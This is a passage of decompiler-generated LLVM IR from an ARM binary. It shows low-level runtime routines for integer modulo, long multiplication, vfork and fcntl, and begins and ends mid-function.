  %v1_119dc39 = phi i32 [ %storemerge95, %dec_label_pc_119d0thread-pre-split.loopexit ], [ %v2_119dc, %.thread4 ]
  %v0_119d0.pr = phi i32 [ %v0_119d0.pr3398, %dec_label_pc_119d0thread-pre-split.loopexit ], [ %v3_119d8, %.thread4 ]
  br label %dec_label_pc_119d0

dec_label_pc_119d0.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119d0.loopexit, %dec_label_pc_119d0thread-pre-split
  %v0_119e4.pr = phi i32 [ %v1_119dc39, %dec_label_pc_119d0thread-pre-split ], [ %storemerge101, %dec_label_pc_119d0.loopexit ]
  %v1_119d8 = phi i32 [ %v0_119d0.pr, %dec_label_pc_119d0thread-pre-split ], [ %v4_119c4, %dec_label_pc_119d0.loopexit ]
  %v2_119d0 = icmp slt i32 %v1_119d8, 0
  br i1 %v2_119d0, label %dec_label_pc_119e4, label %bb79

bb79:                                             ; preds = %dec_label_pc_119d0
  %v4_119d4 = icmp ult i32 %v1_119d8, %v1_119a4
  br i1 %v4_119d4, label %.thread4, label %dec_label_pc_119e4

.thread4:                                         ; preds = %bb79
  %v3_119d8 = mul i32 %v1_119d8, 2
  %v2_119dc = add i32 %v0_119e4.pr, 1
  br label %dec_label_pc_119d0thread-pre-split

dec_label_pc_119e4:                               ; preds = %bb79, %dec_label_pc_119d0
  %v2_119e4 = add i32 %v0_119e4.pr, -3
  %v5_119e8 = icmp slt i32 %v0_119e4.pr, 3
  br i1 %v5_119e8, label %dec_label_pc_11a28, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e4, %bb83
  %v6_11a14 = phi i32 [ %v0_11a1c, %bb83 ], [ %v2_119e4, %dec_label_pc_119e4 ]
  %v1_119f0 = phi i32 [ %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %bb83 ], [ %v1_119a4, %dec_label_pc_119e4 ]
  %v3_11a1012 = phi i32 [ %v3_11a10, %bb83 ], [ %v1_119d8, %dec_label_pc_119e4 ]
  %v3_119ec = icmp ult i32 %v1_119f0, %v3_11a1012
  %v3_119f0 = select i1 %v3_119ec, i32 0, i32 %v3_11a1012
  %v1_119f8 = sub i32 %v1_119f0, %v3_119f0
  %v4_119f4 = udiv i32 %v3_11a1012, 2
  %v6_119f4 = icmp ult i32 %v1_119f8, %v4_119f4
  %v6_119f8 = select i1 %v6_119f4, i32 0, i32 %v4_119f4
  %v1_119f8.v6_119f8 = sub i32 %v1_119f8, %v6_119f8
  %.demorgan = and i1 %v3_119ec, %v6_119f4
  %v4_119fc = udiv i32 %v3_11a1012, 4
  %v6_119fc = icmp ult i32 %v1_119f8.v6_119f8, %v4_119fc
  %v6_11a00 = select i1 %v6_119fc, i32 0, i32 %v4_119fc
  %v1_119f8.v6_119f8.v6_11a00 = sub i32 %v1_119f8.v6_119f8, %v6_11a00
  %.demorgan71 = and i1 %.demorgan, %v6_119fc
  %v4_11a04 = udiv i32 %v3_11a1012, 8
  %v6_11a04 = icmp ult i32 %v1_119f8.v6_119f8.v6_11a00, %v4_11a04
  %v6_11a08 = select i1 %v6_11a04, i32 0, i32 %v4_11a04
  %v1_119f8.v6_119f8.v6_11a00.v6_11a08 = sub i32 %v1_119f8.v6_119f8.v6_11a00, %v6_11a08
  %.demorgan72 = and i1 %.demorgan71, %v6_11a04
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_119ec
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_119ec, %bb80
  %v2_11a0c = add i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, -1
  %v4_11a0c = sub i32 0, %v1_119f8.v6_119f8.v6_11a00.v6_11a08
  %v5_11a0c = and i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %v4_11a0c
  %v3_11a10 = udiv i32 %v3_11a1012, 16
  %v5_11a14 = icmp slt i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, 1
  br i1 %v5_11a14, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_11a14 = add i32 %v6_11a14, -4
  %v9_11a14 = sub i32 3, %v6_11a14
  %v10_11a14 = and i32 %v9_11a14, %v6_11a14
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_11a1c = phi i32 [ %v6_11a14, %bb81 ], [ %v7_11a14, %bb82 ]
  %v0_11a1815.in = phi i32 [ %v2_11a0c, %bb81 ], [ %v7_11a14, %bb82 ]
  %v1_11a1814.in = phi i32 [ %v5_11a0c, %bb81 ], [ %v10_11a14, %bb82 ]
  %v1_11a1814 = icmp slt i32 %v1_11a1814.in, 0
  %v0_11a1815 = icmp slt i32 %v0_11a1815.in, 0
  %v2_11a18 = xor i1 %v0_11a1815, %v1_11a1814
  br i1 %v2_11a18, label %dec_label_pc_11a1c, label %dec_label_pc_119ec

dec_label_pc_11a1c:                               ; preds = %bb83
  %v1_11a1c = urem i32 %v0_11a1c, 4
  %v2_11a1c = icmp eq i32 %v1_11a1c, 0
  br i1 %v2_11a1c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_11a1c
  %v3_11a20 = icmp eq i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, 0
  br i1 %v3_11a20, label %bb76, label %dec_label_pc_11a28

dec_label_pc_11a28:                               ; preds = %bb84, %dec_label_pc_119e4
  %v0_11a3c = phi i32 [ %v3_11a10, %bb84 ], [ %v1_119d8, %dec_label_pc_119e4 ]
  %v1_11a38 = phi i32 [ %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %bb84 ], [ %v1_119a4, %dec_label_pc_119e4 ]
  %v0_11a28 = phi i32 [ %v0_11a1c, %bb84 ], [ %v2_119e4, %dec_label_pc_119e4 ]
  %v5_11a2c = icmp slt i32 %v0_11a28, -2
  br i1 %v5_11a2c, label %dec_label_pc_11a4c, label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %dec_label_pc_11a28
  %v8_11a28 = icmp eq i32 %v0_11a28, -2
  br i1 %v8_11a28, label %dec_label_pc_11a40, label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a30
  %v3_11a34 = icmp ult i32 %v1_11a38, %v0_11a3c
  br i1 %v3_11a34, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_11a34
  %v2_11a34 = sub i32 %v1_11a38, %v0_11a3c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11a34, %bb85
  %v0_11a4052 = phi i32 [ %v1_11a38, %dec_label_pc_11a34 ], [ %v2_11a34, %bb85 ]
  %v3_11a3c = udiv i32 %v0_11a3c, 2
  br label %dec_label_pc_11a40

dec_label_pc_11a40:                               ; preds = %dec_label_pc_11a30, %bb86
  %v0_11a48 = phi i32 [ %v0_11a3c, %dec_label_pc_11a30 ], [ %v3_11a3c, %bb86 ]
  %v1_11a44 = phi i32 [ %v1_11a38, %dec_label_pc_11a30 ], [ %v0_11a4052, %bb86 ]
  %v3_11a40 = icmp ult i32 %v1_11a44, %v0_11a48
  br i1 %v3_11a40, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_11a40
  %v2_11a40 = sub i32 %v1_11a44, %v0_11a48
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_11a40, %bb87
  %v0_11a4c55 = phi i32 [ %v1_11a44, %dec_label_pc_11a40 ], [ %v2_11a40, %bb87 ]
  %v3_11a48 = udiv i32 %v0_11a48, 2
  br label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a28, %bb88
  %v2_11a50 = phi i32 [ %v0_11a3c, %dec_label_pc_11a28 ], [ %v3_11a48, %bb88 ]
  %v1_11a50 = phi i32 [ %v1_11a38, %dec_label_pc_11a28 ], [ %v0_11a4c55, %bb88 ]
  %v3_11a4c = icmp ult i32 %v1_11a50, %v2_11a50
  br i1 %v3_11a4c, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_11a4c
  %v2_11a4c = sub i32 %v1_11a50, %v2_11a50
  br label %bb76

dec_label_pc_11a58:                               ; preds = %entry
  %v0_11a58 = load i32, i32* @lr, align 4
  %v0_11a5c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11a58)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11a50, { 1, 2, 0 }
  uselistorder i32 %v0_11a3c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11a1c, { 1, 0, 2 }
  uselistorder i32 %v7_11a14, { 1, 0 }
  uselistorder i32 %v3_11a10, { 1, 0 }
  uselistorder i32 %v1_119f8.v6_119f8.v6_11a00.v6_11a08, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_11a04, { 1, 0 }
  uselistorder i32 %v4_119fc, { 1, 0 }
  uselistorder i32 %v4_119f4, { 1, 0 }
  uselistorder i32 %v6_11a14, { 3, 0, 2, 1 }
  uselistorder i32 %v2_119e4, { 1, 0 }
  uselistorder i32 %v1_119d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_119c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_119d0.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_119a4, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_11a4c, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_11a40, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_119ec, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_11a68 = icmp eq i32 %arg2, 0
  br i1 %v2_11a68, label %dec_label_pc_11b3c, label %dec_label_pc_11a70

dec_label_pc_11a70:                               ; preds = %entry
  %v1_11a68 = icmp slt i32 %arg2, 0
  br i1 %v1_11a68, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_11a70
  %v2_11a70 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_11a70, %bb
  %v4_11a88 = phi i32 [ %arg2, %dec_label_pc_11a70 ], [ %v2_11a70, %bb ]
  %v0_11a74 = load i32, i32* @r0, align 4
  %v1_11a74 = icmp slt i32 %v0_11a74, 0
  br i1 %v1_11a74, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_11a78 = sub i32 0, %v0_11a74
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_11a80 = phi i32 [ %v0_11a74, %bb79 ], [ %v2_11a78, %bb80 ]
  %v1_11a7c = add i32 %v4_11a88, -1
  %v7_11a7c = icmp eq i32 %v4_11a88, 1
  br i1 %v7_11a7c, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_11a80 = icmp eq i32 %v1_11a80, %v4_11a88
  br i1 %v10_11a80, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_11a80 = icmp ult i32 %v1_11a80, %v4_11a88
  br i1 %v4_11a80, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_11a88 = and i32 %v1_11a7c, %v4_11a88
  %v8_11a88 = icmp eq i32 %v6_11a88, 0
  br i1 %v8_11a88, label %.thread72, label %dec_label_pc_11a98.preheader

dec_label_pc_11a98.preheader:                     ; preds = %bb84
  %v2_11a98109 = icmp ugt i32 %v4_11a88, 268435455
  br i1 %v2_11a98109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_11a8c64 = phi i32 [ %v1_11a80, %bb84 ], [ 0, %.thread70 ]
  %v3_11a8c = and i32 %v1_11a8c64, %v1_11a7c
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_11a98.preheader
  %v0_11aac.pr35.lcssa = phi i32 [ %v4_11a88, %dec_label_pc_11a98.preheader ], [ %v4_11aa0, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11a98.preheader ], [ %v2_11aa49, %.thread2.thread7 ]
  br label %dec_label_pc_11aacthread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_11a98.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_11aa49, %.thread2.thread7 ], [ 0, %dec_label_pc_11a98.preheader ]
  %v0_11aac.pr35110 = phi i32 [ %v4_11aa0, %.thread2.thread7 ], [ %v4_11a88, %dec_label_pc_11a98.preheader ]
  %v4_11a9c = icmp ult i32 %v0_11aac.pr35110, %v1_11a80
  br i1 %v4_11a9c, label %bb86, label %dec_label_pc_11aacthread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_11aa0 = and i32 %v0_11aac.pr35110, 268435456
  %v3_11aa0 = icmp eq i32 %v2_11aa0, 0
  %v4_11aa0 = mul i32 %v0_11aac.pr35110, 16
  br i1 %v3_11aa0, label %.thread2.thread7, label %dec_label_pc_11aac.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_11aa49 = add i32 %storemerge111, 4
  %v2_11a98 = icmp ugt i32 %v4_11aa0, 268435455
  br i1 %v2_11a98, label %.thread1, label %bb85

dec_label_pc_11aacthread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_11aacthread-pre-split.loopexit

dec_label_pc_11aacthread-pre-split.loopexit:      ; preds = %dec_label_pc_11aacthread-pre-split.loopexit.loopexit, %.thread1
  %v0_11aac.pr35108 = phi i32 [ %v0_11aac.pr35.lcssa, %.thread1 ], [ %v0_11aac.pr35110, %dec_label_pc_11aacthread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_11aacthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11aacthread-pre-split

dec_label_pc_11aacthread-pre-split:               ; preds = %.thread4, %dec_label_pc_11aacthread-pre-split.loopexit
  %v1_11ab841 = phi i32 [ %storemerge105, %dec_label_pc_11aacthread-pre-split.loopexit ], [ %v2_11ab8, %.thread4 ]
  %v2_11ab036 = phi i32 [ %v1_11a80, %dec_label_pc_11aacthread-pre-split.loopexit ], [ %v2_11ab0, %.thread4 ]
  %v0_11aac.pr = phi i32 [ %v0_11aac.pr35108, %dec_label_pc_11aacthread-pre-split.loopexit ], [ %v3_11ab4, %.thread4 ]
  br label %dec_label_pc_11aac

dec_label_pc_11aac.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aac.loopexit, %dec_label_pc_11aacthread-pre-split
  %v0_11ac0.pr = phi i32 [ %v1_11ab841, %dec_label_pc_11aacthread-pre-split ], [ %storemerge111, %dec_label_pc_11aac.loopexit ]
  %v2_11ab0 = phi i32 [ %v2_11ab036, %dec_label_pc_11aacthread-pre-split ], [ %v1_11a80, %dec_label_pc_11aac.loopexit ]
  %v1_11ab4 = phi i32 [ %v0_11aac.pr, %dec_label_pc_11aacthread-pre-split ], [ %v4_11aa0, %dec_label_pc_11aac.loopexit ]
  %v2_11aac = icmp slt i32 %v1_11ab4, 0
  br i1 %v2_11aac, label %dec_label_pc_11ac0, label %bb87

bb87:                                             ; preds = %dec_label_pc_11aac
  %v4_11ab0 = icmp ult i32 %v1_11ab4, %v2_11ab0
  br i1 %v4_11ab0, label %.thread4, label %dec_label_pc_11ac0

.thread4:                                         ; preds = %bb87
  %v3_11ab4 = mul i32 %v1_11ab4, 2
  %v2_11ab8 = add i32 %v0_11ac0.pr, 1
  br label %dec_label_pc_11aacthread-pre-split

dec_label_pc_11ac0:                               ; preds = %bb87, %dec_label_pc_11aac
  %v2_11ac0 = add i32 %v0_11ac0.pr, -3
  %v5_11ac4 = icmp slt i32 %v0_11ac0.pr, 3
  br i1 %v5_11ac4, label %dec_label_pc_11b04, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11ac0, %bb91
  %v6_11af0 = phi i32 [ %v0_11af8, %bb91 ], [ %v2_11ac0, %dec_label_pc_11ac0 ]
  %v1_11acc = phi i32 [ %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %bb91 ], [ %v2_11ab0, %dec_label_pc_11ac0 ]
  %v3_11aec10 = phi i32 [ %v3_11aec, %bb91 ], [ %v1_11ab4, %dec_label_pc_11ac0 ]
  %v3_11ac8 = icmp ult i32 %v1_11acc, %v3_11aec10
  %v3_11acc = select i1 %v3_11ac8, i32 0, i32 %v3_11aec10
  %v1_11ad4 = sub i32 %v1_11acc, %v3_11acc
  %v4_11ad0 = udiv i32 %v3_11aec10, 2
  %v6_11ad0 = icmp ult i32 %v1_11ad4, %v4_11ad0
  %v6_11ad4 = select i1 %v6_11ad0, i32 0, i32 %v4_11ad0
  %v1_11ad4.v6_11ad4 = sub i32 %v1_11ad4, %v6_11ad4
  %.demorgan = and i1 %v3_11ac8, %v6_11ad0
  %v4_11ad8 = udiv i32 %v3_11aec10, 4
  %v6_11ad8 = icmp ult i32 %v1_11ad4.v6_11ad4, %v4_11ad8
  %v6_11adc = select i1 %v6_11ad8, i32 0, i32 %v4_11ad8
  %v1_11ad4.v6_11ad4.v6_11adc = sub i32 %v1_11ad4.v6_11ad4, %v6_11adc
  %.demorgan76 = and i1 %.demorgan, %v6_11ad8
  %v4_11ae0 = udiv i32 %v3_11aec10, 8
  %v6_11ae0 = icmp ult i32 %v1_11ad4.v6_11ad4.v6_11adc, %v4_11ae0
  %v6_11ae4 = select i1 %v6_11ae0, i32 0, i32 %v4_11ae0
  %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4 = sub i32 %v1_11ad4.v6_11ad4.v6_11adc, %v6_11ae4
  %.demorgan77 = and i1 %.demorgan76, %v6_11ae0
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_11ac8
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_11ac8, %bb88
  %v2_11ae8 = add i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, -1
  %v4_11ae8 = sub i32 0, %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4
  %v5_11ae8 = and i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %v4_11ae8
  %v3_11aec = udiv i32 %v3_11aec10, 16
  %v5_11af0 = icmp slt i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, 1
  br i1 %v5_11af0, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_11af0 = add i32 %v6_11af0, -4
  %v9_11af0 = sub i32 3, %v6_11af0
  %v10_11af0 = and i32 %v9_11af0, %v6_11af0
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_11af8 = phi i32 [ %v6_11af0, %bb89 ], [ %v7_11af0, %bb90 ]
  %v0_11af413.in = phi i32 [ %v2_11ae8, %bb89 ], [ %v7_11af0, %bb90 ]
  %v1_11af412.in = phi i32 [ %v5_11ae8, %bb89 ], [ %v10_11af0, %bb90 ]
  %v1_11af412 = icmp slt i32 %v1_11af412.in, 0
  %v0_11af413 = icmp slt i32 %v0_11af413.in, 0
  %v2_11af4 = xor i1 %v0_11af413, %v1_11af412
  br i1 %v2_11af4, label %dec_label_pc_11af8, label %dec_label_pc_11ac8

dec_label_pc_11af8:                               ; preds = %bb91
  %v1_11af8 = urem i32 %v0_11af8, 4
  %v2_11af8 = icmp eq i32 %v1_11af8, 0
  br i1 %v2_11af8, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_11af8
  %v3_11afc = icmp eq i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, 0
  br i1 %v3_11afc, label %.thread6, label %dec_label_pc_11b04

dec_label_pc_11b04:                               ; preds = %bb92, %dec_label_pc_11ac0
  %v0_11b18 = phi i32 [ %v3_11aec, %bb92 ], [ %v1_11ab4, %dec_label_pc_11ac0 ]
  %v1_11b14 = phi i32 [ %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %bb92 ], [ %v2_11ab0, %dec_label_pc_11ac0 ]
  %v0_11b04 = phi i32 [ %v0_11af8, %bb92 ], [ %v2_11ac0, %dec_label_pc_11ac0 ]
  %v5_11b08 = icmp slt i32 %v0_11b04, -2
  br i1 %v5_11b08, label %dec_label_pc_11b28, label %dec_label_pc_11b0c

dec_label_pc_11b0c:                               ; preds = %dec_label_pc_11b04
  %v8_11b04 = icmp eq i32 %v0_11b04, -2
  br i1 %v8_11b04, label %dec_label_pc_11b1c, label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b0c
  %v3_11b10 = icmp ult i32 %v1_11b14, %v0_11b18
  br i1 %v3_11b10, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_11b10
  %v2_11b10 = sub i32 %v1_11b14, %v0_11b18
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_11b10, %bb93
  %v0_11b1c54 = phi i32 [ %v1_11b14, %dec_label_pc_11b10 ], [ %v2_11b10, %bb93 ]
  %v3_11b18 = udiv i32 %v0_11b18, 2
  br label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b0c, %bb94
  %v0_11b24 = phi i32 [ %v0_11b18, %dec_label_pc_11b0c ], [ %v3_11b18, %bb94 ]
  %v1_11b20 = phi i32 [ %v1_11b14, %dec_label_pc_11b0c ], [ %v0_11b1c54, %bb94 ]
  %v3_11b1c = icmp ult i32 %v1_11b20, %v0_11b24
  br i1 %v3_11b1c, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_11b1c
  %v2_11b1c = sub i32 %v1_11b20, %v0_11b24
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_11b1c, %bb95
  %v0_11b2857 = phi i32 [ %v1_11b20, %dec_label_pc_11b1c ], [ %v2_11b1c, %bb95 ]
  %v3_11b24 = udiv i32 %v0_11b24, 2
  br label %dec_label_pc_11b28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b04, %bb96
  %v2_11b2c = phi i32 [ %v0_11b18, %dec_label_pc_11b04 ], [ %v3_11b24, %bb96 ]
  %v1_11b2c = phi i32 [ %v1_11b14, %dec_label_pc_11b04 ], [ %v0_11b2857, %bb96 ]
  %v3_11b28 = icmp ult i32 %v1_11b2c, %v2_11b2c
  br i1 %v3_11b28, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_11b28
  %v2_11b28 = sub i32 %v1_11b2c, %v2_11b2c
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11b28, %bb83, %.thread72, %dec_label_pc_11af8, %bb92, %bb97
  %v1_11b34 = phi i32 [ %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, %dec_label_pc_11af8 ], [ 0, %bb92 ], [ %v1_11b2c, %dec_label_pc_11b28 ], [ %v2_11b28, %bb97 ], [ %v3_11a8c, %.thread72 ], [ %v1_11a80, %bb83 ]
  br i1 %v1_11a74, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_11b34 = sub i32 0, %v1_11b34
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_11b38 = phi i32 [ %v1_11b34, %.thread6 ], [ %v2_11b34, %bb98 ]
  ret i32 %v1_11b38

dec_label_pc_11b3c:                               ; preds = %entry
  %v0_11b3c = load i32, i32* @lr, align 4
  %v0_11b40 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11b3c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_11b18, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_11af8, { 1, 0, 2 }
  uselistorder i32 %v7_11af0, { 1, 0 }
  uselistorder i32 %v3_11aec, { 1, 0 }
  uselistorder i32 %v1_11ad4.v6_11ad4.v6_11adc.v6_11ae4, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_11ae0, { 1, 0 }
  uselistorder i32 %v4_11ad8, { 1, 0 }
  uselistorder i32 %v4_11ad0, { 1, 0 }
  uselistorder i32 %v6_11af0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_11ac0, { 1, 0 }
  uselistorder i32 %v1_11ab4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_11ab0, { 1, 0, 3, 2 }
  uselistorder i32 %v4_11aa0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_11aac.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11a80, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_11a88, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_11b28, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11b1c, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_11ac8, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_11b4c = load i32, i32* @r0, align 4
  ret i32 %v1_11b4c
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_11b5c = udiv i32 %arg1, 65536
  %v3_11b60 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_11b5c, -65536
  %v5_11b64 = add i32 %tmp, -1
  %v6_11b64 = and i32 %v5_11b64, %arg1
  %tmp10 = mul i32 %v3_11b60, -65536
  %v5_11b68 = add i32 %tmp10, -1
  %v6_11b68 = and i32 %v5_11b68, %arg3
  %v2_11b6c = mul i32 %v6_11b68, %v6_11b64
  %v2_11b70 = mul i32 %v6_11b68, %v3_11b5c
  %v2_11b74 = mul i32 %v6_11b64, %v3_11b60
  %v2_11b7c = add i32 %v2_11b70, %v2_11b74
  %v3_11b7c = icmp ult i32 %v2_11b7c, %v2_11b70
  br i1 %v3_11b7c, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_11b84 = mul i32 %v2_11b7c, 65536
  %v5_11b84 = add i32 %v4_11b84, %v2_11b6c
  ret i32 %v5_11b84

; uselistorder directives
  uselistorder i32 %v2_11b70, { 1, 0 }
  uselistorder i32 %v6_11b64, { 1, 0 }
  uselistorder i32 %v3_11b60, { 1, 0 }
  uselistorder i32 %v3_11b5c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_11ba0 = call i32 @vfork()
  store i32 %v0_11ba0, i32* @r0, align 4
  %v2_11ba4 = icmp ugt i32 %v0_11ba0, -4097
  br i1 %v2_11ba4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_11bb8, %entry
  %merge = phi i32 [ %v0_11ba0, %entry ], [ %v0_11bb8, %dec_label_pc_11bb8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_11bb0 = icmp eq i32 %v0_11ba0, -38
  br i1 %v4_11bb0, label %dec_label_pc_11bb8, label %bb2

dec_label_pc_11bb8:                               ; preds = %bb1
  %v0_11bb8 = call i32 @fork()
  store i32 %v0_11bb8, i32* @r0, align 4
  %v2_11bbc = icmp ugt i32 %v0_11bb8, -4097
  br i1 %v2_11bbc, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_11bb8
  %v0_11bc4 = call i32 @__syscall_error()
  ret i32 %v0_11bc4

; uselistorder directives
  uselistorder i32 %v0_11bb8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_11bd0 = load i32, i32* @r2, align 4
  %v1_11be0 = add i32 %arg2, -12
  store i32 %v6_11bd0, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_11be0, 2
  br i1 %tmp, label %dec_label_pc_11c08, label %dec_label_pc_11c00

dec_label_pc_11c00:                               ; preds = %entry
  %v0_11c00 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_11c34

dec_label_pc_11c08:                               ; preds = %entry
  %v2_11c10 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_11c10, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_11c10, -4095
  br i1 %tmp8, label %dec_label_pc_11c34, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c08
  %v0_11c20 = call i32 @__errno_location()
  %v0_11c24 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c24 = sub i32 0, %v0_11c24
  %v2_11c28 = inttoptr i32 %v0_11c20 to i32*
  store i32 %v1_11c24, i32* %v2_11c28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c34

